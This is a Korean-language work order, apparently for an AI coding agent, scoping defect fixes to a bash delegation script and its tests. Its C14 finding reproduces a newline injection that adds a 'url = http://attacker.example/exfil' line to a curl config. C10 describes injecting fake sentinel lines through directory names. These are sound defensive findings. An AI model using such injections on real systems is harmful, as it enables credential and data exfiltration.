# Task 2c: v3 로컬 축 결함 폐쇄 — 오탐·프리플라이트·권한·배선

- **에이전트**: kit-scripts
- **모델**: heavy
- **대상 파일**: `core/scripts/run-delegation.sh`, `core/scripts/opencode-serve-ctl.sh`,
  `scripts/opencode-serve-ctl.sh`(심링크 신설), `tests/test_run_delegation.py`, `tests/test_serve_ctl.py`
- **선행**: Task 2b (워치독 계층 재설계) — **2b 커밋 후에 착수**한다. 같은 파일을 만지므로 병행 금지.
- **재사용**: 개선 후 재사용 — 신규 스크립트 금지. curl basic-auth 는
  `core/scripts/opencode-serve-ctl.sh` 가 **소유**하므로 그쪽 액션으로 올린다(아래 C7).

## 범위 경계

이 task 는 **워치독 계층의 구조를 건드리지 않는다** — 세션 식별 방식·출력 포맷·abort 흐름은
Task 2b 가 확정한 대로 둔다.

> **⚠️ 이번 라운드(2c)의 범위는 아래 목록으로 한정한다.** 원래 C1~C17 을 한 라운드로 잡았으나,
> 2b 에서 "큰 라운드가 새 결함을 만든다"가 세 번 반복돼 **판정·진단 축(2c)** 과
> **배선·권한 축(2d)** 으로 분리했다. 파일도 테스트도 갈리므로 독립적이다.
>
> | 라운드 | 항목 | 대상 파일 |
> |---|---|---|
> | **2c (이번)** | **C1·C2·C3·C4·C9·C12·C13·C16** + C15 의 회귀 테스트분(D7·D8) | `core/scripts/run-delegation.sh`, `tests/test_run_delegation.py` |
> | 2d (다음) | C5·C6·C7·C8·C10·C11·C14·C17 + C15 의 curl 3중 복제분 | `core/scripts/opencode-serve-ctl.sh`, `scripts/` 심링크, 락·권한 계열 |
>
> **2d 항목은 이번에 건드리지 말 것.** 특히 심링크 신설·로그 권한·스핀락 PID·curl 을 ctl 액션으로
> 통합하는 작업은 다음 라운드다. 발견해도 보고만 하라.
>
> 따라서 이번 라운드의 **대상 파일은 `core/scripts/run-delegation.sh` 와
> `tests/test_run_delegation.py` 둘뿐**이다 (위 헤더의 대상 파일 목록 중 나머지는 2d 소관).
> 아래 "실패 테스트" 목록에서도 `test_spinlock_writes_pid_file`·`test_log_file_permissions_are_600`·
> `test_lock_name_strips_newlines`·`tests/test_serve_ctl.py` 는 **2d 로 이월**한다.
> 이번에 쓸 실패 테스트는 `test_agent_not_found_ignores_agent_output`·
> `test_agent_not_found_detects_raw_quote_form`·`test_preflight_ignores_attach_processes` 와
> C12·C13·C16 용 신규 테스트다.

## 고쳐야 할 결함

### 🔴 C1. exit 7 오탐이 성공한 위임을 죽이고 건강한 세션을 abort 한다 (bash-reviewer)
`agent_not_found_in_log()` 가 로그 **전체**를 `grep -aF` 한다. v2 의 `FAIL_RE` 는 "에이전트 산출물의
우연한 매치 배제"를 위해 **ERROR 라인 + 말미 50줄**로 의도적으로 좁혀 놨는데 그 방어를 물려받지 않았다.
재현: 산출물 본문에 `agent "worker" not found` 문구가 들어간 **rc=0 정상 완료** 위임이 `rc=7` 로 폐기되고
살아 있는 세션에 abort 가 날아갔다.
→ **스코프를 좁힌다**: 이 경고는 클라이언트가 **실행 초기에만** 낸다. 로그 **앞부분(예: 첫 30줄)**
  으로 한정하거나, 그와 동등한 근거 있는 스코프를 쓴다. 전체 스캔 금지.

### 🔴 C2. exit 7 감지가 실측 형식을 검증하지 않는다 (bash-reviewer, 변이 생존)
인덱스 전제표의 실측값은 **생 따옴표** — `! agent "scheduler" not found. Falling back to default agent`.
그런데 테스트 스텁은 JSON 이스케이프된 `agent \"worker\" not found` 만 만들어낸다.
변이 검증: 실제 형식 분기를 **삭제해도 7 테스트 전원 통과**(생존), 이스케이프 분기만 삭제하면 3건 실패.
→ 테스트가 **실측 형식(생 따옴표)** 을 우선 검증하도록 고친다. Task 2b 가 텍스트 포맷으로 되돌렸으므로
  실제로 나오는 형식은 생 따옴표다. 이스케이프 변형 지원 여부는 근거를 주석에 남기고 결정한다.

### 🔴 C3. 프리플라이트가 정상 병렬 세션을 오탐한다 (silent-failure-hunter)
`PREFLIGHT_UNMANAGED` 가 `ps ... | awk '/opencode run/'` 로 스캔한다. 이 판정은 "모든 위임이 하나의
전역 락을 공유한다"는 v2 전제에서만 옳다. 이제는 **다른 프로젝트의 건강한 `opencode run --attach`**
클라이언트가 같은 부분문자열에 걸려, 정상 standalone 폴백이 exit 3 으로 죽는다(실측 재현).
이 페이즈의 목표(안전한 프로젝트 간 병렬)를 정면으로 훼손한다.
→ 스캔에서 `--attach` 를 무조건 제외하면 **누수된 고아 attach 프로세스도 안 보이게 된다** —
  2026-08-13 실측: 테스트가 남긴 스텁 `opencode run ... --attach` 2개(PPID=1, 스크립트 파일마저
  삭제됨)가 5분 넘게 살아 실제 위임을 exit 3 으로 막았다. 무조건 제외했다면 그 유령을 놓쳤을 것이다.
  → **판별자는 `--attach` 유무가 아니라 "관리되는가"다**: 관리되는 위임은 살아 있는 부모
  (`run-delegation.sh`)를 갖고, 유령은 **PPID=1** 이다. `--attach` 이면서 PPID≠1 인 것만 정상으로 보고
  제외하고, **PPID=1 인 것은 attach 여부와 무관하게 계속 경고**한다. 근거를 주석에 남길 것.

  **추가 실측 (2026-08-13) — 스캔이 자기 자신을 잡는다.** 오케스트레이터가 이 지시서의 위임
  프롬프트를 히어독으로 쓰는 셸 명령이 `PREFLIGHT_UNMANAGED`(exit 3)에 걸렸다 — 프롬프트 본문에
  `opencode run` 이라는 **문자열**이 들어 있어 그 셸의 argv 가 `/opencode run/` 패턴에 매칭됐다.
  이 저장소 CLAUDE.md 가 기록한 "`pgrep -f` 는 감시 루프 자신의 명령줄에 매칭된다" 함정과 같은 계열이며,
  위임 스크립트를 고치는 페이즈에서는 **프롬프트가 그 문자열을 반드시 포함**하므로 재발이 보장된다.
  → 판정을 **argv 어딘가의 부분문자열이 아니라 실행 파일 기준**으로 바꿀 것 —
  실행 경로가 실제 `opencode` 바이너리(`$OPENCODE_BIN` 또는 `*/opencode`)이고 첫 인자가 `run` 인
  프로세스만 후보로 삼는다. 자기 PID·자기 프로세스 그룹도 제외한다.
  회귀 테스트: `ps` 스텁이 argv 에 `opencode run` 문자열만 포함한 **무관한 셸**을 보여줄 때 exit 3 이 아니어야 한다.

### 🟠 C4. 프리플라이트가 `opencode serve` 를 못 본다 (bash-reviewer)
반대 방향의 구멍이다. standalone 폴백은 살아 있는 serve 데몬 **옆에서** 그냥 실행되는데,
그것이 업스트림이 "고칠 계획 없음"으로 확정한 다중 프로세스 세션 DB 경합이다.
특히 `ensure` 성공 후 PORT 미검출로 강등되는 경로는 **serve 가 확실히 살아 있는 상태**라
경합이 확률이 아니라 보장된다.
→ standalone 진입 전에 serve 가 떠 있으면 경고를 출력한다. 차단할지 경고만 할지는
  **C3 와 모순되지 않게** 결정하고 근거를 주석에 남긴다 (제안: serve 가 살아 있는데 standalone 으로
  내려가야 하는 상황은 설정 오류이므로 `SERVE_ALIVE_FALLBACK` 경고 + 계속 진행).

### 🟠 C5. 로그·락 파일이 world-readable (security-reviewer)
실측: 로그 파일 `644`, 상태 디렉터리 `755` (기본 umask 0022 상속). 로그에는 프롬프트 전문과
세션 ID 가 그대로 남는다. **이 머신은 공용 서버**이고, 같은 저장소의 `serve.env` 는
group/other 읽기·쓰기를 exit 64 로 거부할 만큼 엄격하다 — 동일 기준이 로그에는 전혀 적용되지 않았다.
→ 로그 파일 `600`, 상태 디렉터리 `700` 으로 생성한다 (`umask 077` 또는 명시 `chmod`).

### 🟠 C6. mkdir 스핀락 PID 기록이 깨졌다 — macOS 회귀 (오케스트레이터 실측)
`printf '%s\n' "$$" > "$MLOCK"` 인데 `$MLOCK` 은 `mkdir` 로 만든 **디렉터리**다.
v2 는 `> "$MLOCK/pid"` 였다. flock 없는 PATH 에서 `Is a directory` 후 pid 파일 없이 진행하고,
읽기측은 여전히 `$MLOCK/pid` 를 본다 → **스테일 락 감지가 영구 무력화**된다.
EXIT 트랩을 못 타고 죽은 홀더가 남기면 이후 모든 위임이 30분 대기 후 exit 4.
리눅스 테스트(flock 존재)는 이 경로를 한 번도 타지 않는다.
→ v2 대로 `$MLOCK/pid` 에 쓴다. **flock 없는 환경 회귀 테스트를 추가**한다(아래 실패 테스트).

### 🟠 C7. curl basic-auth 패턴이 두 스크립트에 중복 구현 (security-reviewer / bash-reviewer)
`run-delegation.sh` 와 `opencode-serve-ctl.sh:health_check()` 가 "PW 를 `ps` 에 노출하지 않으려
curl config 를 stdin 으로 전달"하는 **동일한 보안 패턴을 각자 재구현**했다.
Task 1 제약은 "헬스: 재구현 금지, ctl 스크립트 경유"였다 — 서버 API 표면은 ctl 이 소유한다.
→ ctl 에 액션을 추가해(예: `abort <sessionID>`, `session-list`) run-delegation 이 그것을 호출하게 한다.
  ctl 의 기존 exit 계약(0/1/64)과 stdout 계약(`up`/`down`/`started`/`stopped`)을 깨지 말 것 —
  새 액션의 stdout 계약을 정의하고 지시서에 남겨라.
  **주의**: Task 2b 가 세션 조회·abort 를 어떻게 구현했는지 먼저 읽고, 그 호출부를 ctl 경유로 옮기는 것이다.

### 🟠 C8. 심링크 누락 — 키트 자신에서 attach 가 도달 불가 (오케스트레이터 실측)
이 저장소의 `scripts/` 는 **파일별 심링크** 디렉터리다(`scripts/X.sh -> ../core/scripts/X.sh`, git 추적).
Task 1 이 `core/scripts/` 에만 파일을 만들어, `bash scripts/run-delegation.sh` 실행 시
`SCRIPT_DIR` 이 `scripts/` 라 ctl 을 못 찾고 **항상 standalone 폴백**한다(rc=127 실측).
즉 도그푸딩 환경에서 페이즈 목표인 병렬화가 실효되지 않는다.
→ `scripts/opencode-serve-ctl.sh -> ../core/scripts/opencode-serve-ctl.sh` 심링크를 추가하고 git 에 등록한다.
  (신규 프로젝트는 `lib/stamp.sh` 가 `core/scripts` 트리를 통째로 복사하므로 영향 없음.
   기존 4개 프로젝트는 실제 사본이라 Task 5 가 복사한다.)

### 🟡 C9. 폴백 사유 오표기
ctl 부재(rc=127)인데 메시지가 `(serve 기동 실패)` 로 나온다. 원인 구분이 없다.
→ ctl 부재 / 기동 실패 / 포트 미검출 / 인증정보 없음(2b 가 추가) 을 각각 구분해 출력한다.

### 🟡 C10. 락 파일명에 개행 주입 가능
`PROJECT_NAME=$(basename ...)` 에 검증이 없다. 개행 포함 디렉터리명은 리눅스에서 합법이고,
그 값이 `LOCK_WAIT(project): ... (락: $LOCK_FILE)` 로 stdout 에 그대로 나간다. 이 stdout 은
오케스트레이터·리뷰어가 `MODEL_USED=`·`DONE` 같은 센티널로 파싱하는 대상이라 **가짜 라인 주입**이 가능하다.
→ 락 파일명에 쓰기 전에 개행·제어문자를 제거한다.

### 🟢 C11. 잔여 정리
- `mkdir -p "$LOCK_DIR"` 실패에 `exit 4`(락 타임아웃) 를 재사용한다 — 의미 확장. 적절한 코드로 바꾸거나 근거를 주석에 남긴다.
- `stop_watchdog_client()` 는 `kill_client()` 의 순수 별칭 — 간접층 제거.
- `test_model_fallback_chain_preserved` 의 죽은 첫 스텁 정의와 미사용 `COUNT_FILE` 정리.

## 명시적 범위 밖 (건드리지 말 것)

- **`cd "$(dirname "$0")/.."` 복원** — v3 가 제거해 standalone 실행 cwd 가 저장소 루트에서
  호출자 cwd 로 바뀐 것은 계약 변화다. 그러나 Task 2b 의 세션 `directory` 매칭이 `$RUN_DIR` 에
  의존하므로 지금 되돌리면 2b 설계가 흔들린다. **Task 4 가 "저장소 루트에서 호출해야 한다"를
  계약으로 문서화**하는 것으로 처리한다.
- 락 해시 6자리 CRC 충돌(가용성 🟡) — 후속 페이즈 후보.
- 워치독 계층 일체 (Task 2b 소유).

## 실패 테스트 (RED 먼저 — 기존 테스트를 깨뜨리지 말 것)

- `tests/test_run_delegation.py::test_agent_not_found_ignores_agent_output` — 산출물 **본문**에
  `agent "worker" not found` 가 있고 rc=0 이면 **exit 0** 이어야 한다 (C1 회귀 가드)
- `::test_agent_not_found_detects_raw_quote_form` — 실측 형식(생 따옴표)으로 exit 7 (C2)
- `::test_preflight_ignores_attach_processes` — `ps` 스텁이 `opencode run --attach ...` 를 보여줘도 exit 3 이 아니다 (C3)
- `::test_spinlock_writes_pid_file` — flock 없는 PATH 에서 `$MLOCK/pid` 가 실제로 생성되고 스테일 감지가 동작한다 (C6)
- `::test_log_file_permissions_are_600` — 로그 파일 권한이 `600` (C5)
- `::test_lock_name_strips_newlines` — 개행 포함 디렉터리명에서 락 파일명에 개행이 없다 (C10)
- `tests/test_serve_ctl.py::<신규>` — C7 로 추가한 ctl 액션의 정상·실패 경로

## 필수 규칙
- bash 3.2 호환 · CLI 인터페이스 불변 · exit 코드 의미 불변(2b 가 추가한 6 포함)
- 금지사항 3종 주석 유지 · 근거 주석 삭제 금지
- 테스트는 임시 디렉터리 주입. 실제 `~/.local/state/orchestrate`·실제 serve 금지
- **`scripts/opencode-serve-ctl.sh` 는 심링크로 만든다** — 사본 금지 (사본을 만들면 원본과 갈라진다)

## 완료 조건
- `python3 -m unittest discover -s tests -v` 전건 PASS (신규 RED 선행 출력 첨부)
- `bash -n core/scripts/run-delegation.sh core/scripts/opencode-serve-ctl.sh` 통과
- `ls -la scripts/opencode-serve-ctl.sh` 가 심링크임을 보이는 출력 첨부
- **flock 없는 환경 실측** — `PATH` 에서 flock 을 제거하고 전체 스위트를 돌린 출력 첨부
  (Task 2 시점에는 이 환경에서 락 테스트 2건이 FAIL 했다 — Task 3 과 함께 닫힐 것)
- 변이 검증 2건 이상 (C1·C6) 을 저장소 밖 사본에서 수행하고 결과 첨부

## 공통 금지
대상 파일 외 수정 금지 · `git commit`/`git push` 금지 · docker 조작 금지 ·
`scripts/run-delegation-v2.sh`(오케스트레이터 임시 파일)를 읽지도 고치지도 말 것 ·
작업 전 skill 툴로 `karpathy-guidelines` 로드

## 보고 형식
수정·생성 파일 목록 / RED·GREEN 출력 전문 / flock 없는 환경 출력 / 변이 검증 결과 /
C1~C11 각각 "어떻게 닫았는지" 한 줄 / C7 로 추가한 ctl 액션의 stdout·exit 계약 /
Task 3·5 로 넘길 전파 제약

---

## Task 2b 에서 이월된 항목 (2026-08-13, 재위임 한도 소진으로 이관 — 사용자 승인)

Task 2b(`1d3957e`·`1409ac7`)는 리뷰어 3종의 🔴 8건과 후속 D1~D11 중 대부분을 닫았으나,
아래 2건이 남은 채 한도가 소진됐다. **동작 자체는 정상이고 방어·진단 품질 문제다.**

### 🟠 C12. D5 회귀 방어가 고정되지 않았다 (테스트 결함)
`AGENT_NOT_FOUND` 진단을 abort 시도보다 먼저 출력하도록 고친 것은 **코드상 올바르다**
(양쪽 재현에서 진단이 먼저 나온다). 문제는 그것을 지키는 테스트
`test_agent_not_found_diagnostic_survives_abort_failure` 가 **비결정적 분기**를 탄다는 것이다.

검수자 계측(분기마다 프로브 삽입, 5회 실행): `POST_WAIT` 4회 / `INIT_LOOP` 1회 —
스텁 클라이언트의 즉시 종료와 `sleep` 스텁의 경합에 따라 경로가 바뀐다. 결함 지점인
**init 루프·진행 루프 두 곳의 출력 순서를 되돌려도 전체 159건이 그린**이다(변이 M9·M10 생존).
그 테스트가 죽는 이유는 wait 후 블록에 추가된 `abort_or_exit` 때문이지 출력 순서 때문이 아니다.

→ **클라이언트가 세션 확보 후에도 살아 있어 진행 루프에서 `agent not found` 를 잡는
결정적(deterministic) 테스트**를 추가하라. 완료 조건: init 루프·진행 루프 각각의 출력 순서를
되돌리는 변이 2건이 **모두 죽어야** 한다.

### 🟠 C13. D3 수정이 거울상 오보고를 만들었다 (소스 1줄)
init 스톨 처리에서 `ORPHAN_SESSIONS=미확보` 가 **abort 성공 여부와 무관하게 무조건** 출력된다:
```bash
if [ "$MODE" = "attach" ]; then
    discover_server_session || true
    [ -n "$SESSION_ID" ] && abort_or_exit
    echo "ORPHAN_SESSIONS=미확보"     # ← abort 성공해도 실행
fi
```
재현(늦게 도착한 세션이 init 스톨 후 조회에서 보이는 경우):
```
SESSION_ID=ses_late (서버 API 차분에서 확보)
SESSION_ABORTED=ses_late
ORPHAN_SESSIONS=미확보        ← abort 성공했는데 고아 미확보로 보고
```
D1(무작업을 성공으로 오보고)의 거울상 — **성공을 고아로 오보고**다. `else` 분기로 옮기는 1줄 수정.
회귀 테스트도 함께 추가할 것.

### 🟠 C14. `serve.env` 재소싱에서 검증이 누락됐다 (security-reviewer 🟠 F2)
`opencode-serve-ctl.sh` 는 `serve.env` 를 읽은 뒤 PW 의 따옴표·백슬래시·개행과 PORT 숫자 형식을
**검증**한 다음에야 curl config 를 만든다. `run-delegation.sh` 는 **같은 파일을 독립적으로 다시
소싱**하면서(53~60행) 그 검증을 물려받지 않고 `$PASSWORD`·`$PORT` 를 자기 curl heredoc 3곳에 넣는다.

지금 안전한 이유는 `ctl ensure` 가 먼저 실패해 standalone 으로 강등되기 때문일 뿐 —
**형제 스크립트의 exit 코드에 의존하는 암묵적 결합**이지 지역 방어가 아니다.
재현(ctl 을 `exit 0` 스텁으로 갈고 PW 에 개행 주입):
```
user = "opencode:evil
url = http://attacker.example/exfil"
url = "http://127.0.0.1:4096/session"
```
→ curl config 에 두 번째 `url =` 지시가 주입된다.
**C7(curl 을 ctl 액션으로 통합)과 같은 자리에서 해결하라** — 통합하면 검증도 ctl 이 소유하게 된다.
통합하지 않기로 한다면 `run-delegation.sh` 안에서 PW·PORT 를 **지역 재검증**할 것.

### 🟡 C15. 잔여 회귀 방어 부재 (변이 생존, 비블로킹)
- `POLL_FAILURES` 의 `-ge 3` + 주기 재출력(D8), `discover_server_session` 중복 호출 제거(D7) —
  둘 다 변이가 생존한다. 회귀 테스트를 추가하라.
- `curl --config -` 관용구가 `run-delegation.sh` 안에서만 **3중 복제**돼 있다
  (`server_sessions`·`server_progress`·`abort_server_session`). C7 통합 시 함께 접을 것.
  변수명도 ctl 은 `PW`, run-delegation 은 `PASSWORD` 로 갈렸다.

### 🟡 C16. 진행 폴 실패에 종료 게이트가 없다
D4 로 비-2xx 를 폴 실패로 세게 됐지만, `POLL_FAILURES` 가 아무리 쌓여도 **종료로 이어지지 않는다**.
클라이언트가 `ERROR` 없이 조용히 매달리면 관측만 되고 끝나지 않는다.
→ 폴 실패가 일정 횟수(예: 연속 10회 = 100초) 넘으면 스톨로 판정해 기존 스톨 경로를 타게 하라.

### 🟡 C17. `RUN_DIR` 정확 일치 의존
세션 매칭이 `RUN_DIR=$(pwd -P)` 와 서버가 기록한 `.directory` 의 **문자열 정확 일치**에 의존한다.
심링크 경로가 개입해 어긋나면 attach 가 영구 exit 2 가 된다. 테스트는 전부 정확 일치라 이 위험을
잡지 못한다. → 실서버 1회 실측으로 확인하거나, 불가하면 근거 주석을 남길 것.
